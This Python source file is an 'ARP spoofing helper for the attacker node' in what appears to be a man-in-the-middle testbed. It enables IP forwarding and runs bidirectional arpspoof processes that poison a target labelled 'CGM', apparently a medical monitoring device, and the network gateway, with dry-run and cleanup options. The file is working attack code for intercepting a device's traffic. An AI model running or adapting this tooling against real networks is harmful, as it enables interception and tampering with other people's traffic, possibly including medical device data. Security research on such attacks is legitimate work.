"""ARP spoofing helper for the attacker node."""

from __future__ import annotations

import logging
import subprocess
from pathlib import Path

from config import AttackerConfig

LOGGER = logging.getLogger(__name__)

_IP_FORWARD_PATH = Path("/proc/sys/net/ipv4/ip_forward")


class ArpSpoofer:
    """Enable IP forwarding and run bidirectional ARP spoofing."""

    def __init__(self, config: AttackerConfig, dry_run: bool = False) -> None:
        self._cfg = config
        self._dry_run = dry_run
        self._processes = []

    def enable_ip_forwarding(self) -> None:
        """Enable kernel IP forwarding if configured."""
        if not self._cfg.enable_ip_forwarding:
            LOGGER.info("ip_forwarding disabled in config, skipping")
            return

        if self._dry_run:
            LOGGER.info("dry_run: echo 1 > %s", _IP_FORWARD_PATH)
            return

        try:
            _IP_FORWARD_PATH.write_text("1\n", encoding="ascii")
            LOGGER.info("ip_forwarding enabled path=%s", _IP_FORWARD_PATH)
        except PermissionError:
            LOGGER.error(
                "ip_forwarding failed: must run as root. "
                "Alternative: echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward"
            )

    def disable_ip_forwarding(self) -> None:
        """Disable kernel IP forwarding."""
        if not self._cfg.enable_ip_forwarding:
            LOGGER.info("ip_forwarding cleanup skipped by config")
            return

        if self._dry_run:
            LOGGER.info("dry_run: echo 0 > %s", _IP_FORWARD_PATH)
            return

        try:
            _IP_FORWARD_PATH.write_text("0\n", encoding="ascii")
            LOGGER.info("ip_forwarding disabled path=%s", _IP_FORWARD_PATH)
        except PermissionError:
            LOGGER.error(
                "ip_forwarding disable failed: must run as root. "
                "Alternative: echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward"
            )

    def start(self) -> None:
        """Start bidirectional ARP spoofing."""
        if not self._cfg.enable_arp_spoofing:
            LOGGER.info("arp_spoofing disabled in config, skipping")
            return

        iface = self._cfg.network_interface
        cgm_ip = self._cfg.cgm_ip
        gw_ip = self._cfg.gateway_ip

        # Poison CGM: tell it that gateway_ip is at the attacker-node MAC
        cmd_a = ["arpspoof", "-i", iface, "-t", cgm_ip, gw_ip]
        # Poison gateway: tell it that cgm_ip is at the attacker-node MAC
        cmd_b = ["arpspoof", "-i", iface, "-t", gw_ip, cgm_ip]

        if self._dry_run:
            LOGGER.info("dry_run arp_direction_a: %s", " ".join(cmd_a))
            LOGGER.info("dry_run arp_direction_b: %s", " ".join(cmd_b))
            LOGGER.info("dry_run: verify with: arp -n on each target machine")
            return

        LOGGER.info("starting arp_direction_a: %s", " ".join(cmd_a))
        self._processes.append(
            subprocess.Popen(cmd_a, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        )
        LOGGER.info("starting arp_direction_b: %s", " ".join(cmd_b))
        self._processes.append(
            subprocess.Popen(cmd_b, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        )
        LOGGER.info(
            "arp_spoofing started processes=%d cgm=%s gateway=%s iface=%s",
            len(self._processes),
            cgm_ip,
            gw_ip,
            iface,
        )

    def stop(self) -> None:
        """Stop the arpspoof processes."""
        for proc in self._processes:
            proc.terminate()
        for proc in self._processes:
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
        self._processes.clear()
        LOGGER.info("arp_spoofing stopped")
